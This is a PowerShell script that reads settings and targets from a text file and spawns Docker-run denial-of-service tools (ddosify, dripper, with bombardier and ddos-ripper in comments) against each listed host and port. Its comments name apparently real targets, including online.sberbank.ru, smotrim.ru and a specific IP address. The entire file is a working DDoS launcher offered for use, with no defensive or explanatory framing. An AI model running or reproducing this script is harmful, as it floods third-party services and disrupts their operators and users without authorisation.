$FileName = ".\commands\commands.txt"

$Requests = (Get-Content $FileName | Where-Object {$_ -match "Requests"} | Select-Object -First 1).replace(' ','').Split(':')[1];
$Duration = (Get-Content $FileName | Where-Object {$_ -match "Duration"} | Select-Object -First 1).replace(' ','').Split(':')[1];
$Timeout = (Get-Content $FileName | Where-Object {$_ -match "Timeout"} | Select-Object -First 1).replace(' ','').Split(':')[1];
$Turbo = (Get-Content $FileName | Where-Object {$_ -match "Turbo"} | Select-Object -First 1).replace(' ','').Split(':')[1];

# Commands examples
# "docker run -ti --rm alpine/bombardier -c 1000 -d 10800s -l https://online.sberbank.ru/"
# "docker run --rm -i --entrypoint python3 nitupkcuf/ddos-ripper:latest -u DRipper.py -s 178.248.233.32 -t 135 -p 80"
# "docker run -it --rm ddosify/ddosify ddosify -t smotrim.ru -n 5000 -d 6000 -p HTTPS -m PUT -T 5"
# "docker run -it --rm alexmon1989/dripper:1.0.1 -s IP -p PORT NUMBER -t 5000"

$ConstPart1 = "docker run ";

$Alpine1 = $ConstPart1 + "-ti --rm alpine/bombardier -c " + $Requests + " -d " + $Duration + "s -l ";

$Ddos_ripper1 = $ConstPart1 + "--rm -i --entrypoint python3 nitupkcuf/ddos-ripper:latest -u DRipper.py -s ";
$Ddos_ripper2 = " -t " + $Turbo + " -p ";

$Ddosify1 = $ConstPart1 + "-it --rm ddosify/ddosify ddosify -t ";
$Ddosify2 = " -n " + $Requests + " -d " + $Duration + " -p ";
$Ddosify3 = " -m PUT -T " + $Timeout;

$Dripper1 = $ConstPart1 + "-it --rm alexmon1989/dripper:1.0.1 -s ";
$Dripper2 = " -p ";
$Dripper3 = " -t " + $Duration;

$Targets = (Get-Content $FileName | Select-Object -Skip 5).replace(' ','').Split(':');

for ($num = 0 ; $num -lt $Targets.Length ; $num++) {
    $Target = $Targets[$num].Split(',');

    if ($Target.Length -eq 1) {
        $Targets[++$num].Split(',') | ForEach-Object {
            if ($_ -eq 80) {
                Start-Process powershell ($Ddosify1 + $Target + $Ddosify2 + "HTTP" + $Ddosify3);
            }
            elseif ($_ -eq 443) {
                Start-Process powershell ($Ddosify1 + $Target + $Ddosify2 + "HTTPS" + $Ddosify3);
            }
            else {
                Start-Process powershell ($Dripper1 + $Target + $Dripper2 + $_ + $Dripper3);
            }
        }
    }
}